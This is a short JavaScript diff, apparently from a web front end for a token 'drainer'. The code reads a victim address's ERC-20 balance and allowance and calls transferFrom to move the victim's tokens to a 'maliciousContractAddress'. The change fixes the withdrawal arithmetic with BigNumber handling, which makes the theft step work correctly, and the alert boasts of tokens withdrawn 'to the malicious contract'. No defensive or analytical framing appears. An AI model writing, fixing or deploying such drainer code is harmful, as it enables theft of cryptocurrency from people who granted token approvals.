@@ -474,18 +474,23 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Get the victim's token balance
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
 
-            // Calculate the amount to withdraw, which is the minimum of the balance and allowance
-            const amountToWithdraw = Math.min(balance, allowance);
+            // Convert values to Big Numbers (Web3 will handle the decimal scaling automatically)
+            const balanceBN = web3.utils.toBN(balance);
+            const allowanceBN = web3.utils.toBN(allowance);
 
-            if (amountToWithdraw <= 0) {
+            // Calculate the amount to withdraw, which is the minimum of the balance and allowance
+            const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
+
+            // Check if there's any available amount to withdraw
+            if (amountToWithdraw.lte(web3.utils.toBN(0))) {
                 alert("Insufficient allowance or balance to withdraw.");
                 return;
             }
 
-            // Now, safely withdraw the tokens (amountToWithdraw should already be in the correct format for transfer)
-            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw).send({ from: accounts[0] });
+            // Withdraw the tokens (amountToWithdraw is already in the correct unit)
+            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({ from: accounts[0] });
 
-            alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
+            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw.toString(), 'ether')} tokens from the victim's account to the malicious contract!`);
         } catch (error) {
             alert("Error during withdrawal. Please check the details.");
             console.error("Withdrawal Error:", error);
